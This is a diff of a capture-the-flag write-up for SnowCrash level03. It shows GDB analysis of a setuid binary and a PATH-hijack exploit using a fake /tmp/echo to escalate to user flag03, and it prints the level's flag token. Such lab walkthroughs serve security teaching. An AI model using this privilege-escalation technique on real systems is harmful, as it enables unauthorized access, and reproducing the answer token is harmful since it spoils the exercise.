@@ -5,18 +5,18 @@
 level03@SnowCrash:~$ ls -l
 total 12
 -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+```
 
+```
 level03@SnowCrash:~$ ./level03
 Exploit me
 ```
 
 
-- A binary has been left for us; it belongs to user flag03 and the group level03. Additionally, [the setuid and setgid permission bits](https://en.wikipedia.org/wiki/Setuid) are set.
-Thus, this binary is executed with the privileges of user flag03 and the group level03.
+- A binary has been left for us, it belongs to user flag03 and group level03. Additionally, [the setuid and setgid permission bits](https://en.wikipedia.org/wiki/Setuid) are set.
+Thus, this binary is executed with the privileges of user flag03 and group level03.
 Let's take a closer look at this binary using [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
 ```
-gdb ./level03
-...
 (gdb) info functions
 All defined functions:
 
@@ -27,6 +27,7 @@ Non-debugging symbols:
 0x08048340  _init
 ...
 ```
+
 ```
 (gdb) disas main
 Dump of assembler code for function main:
@@ -60,7 +61,7 @@ End of assembler dump.
 ```
 
 
-- It can be seen that the program makes a call to `<system@plt>` right after moving the address `0x80485e0` to the top of [the stack](https://en.wikipedia.org/wiki/Stack_(abstract_data_type)).
+- We can see that the program makes a call to `<system@plt>` right after moving the address `0x80485e0` on top of the stack.
 Let's display the value contained at this address.
 ```
 (gdb) x/s 0x80485e0
@@ -72,12 +73,22 @@ Let's display the value contained at this address.
 In bash, `echo` is a built-in command, but with the preceding `/usr/bin/env`, the program will use the `PATH` environment variable to search for the echo binary.
 ```
 level03@SnowCrash:~$ echo "getflag" > /tmp/echo
-level03@SnowCrash:~$ chmod +x /tmp/echo
-level03@SnowCrash:~$ export PATH=/tmp:$PATH
+```
 
+```
+level03@SnowCrash:~$ chmod +x /tmp/echo
+```
+
+```
+level03@SnowCrash:~$ export PATH=/tmp:$PATH
+```
+
+```
 level03@SnowCrash:~$ ./level03
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+```
 
+```
 level03@SnowCrash:~$ su level04
 Password:qi0maab88jeaj46qoumi7maus
 level04@SnowCrash:~$
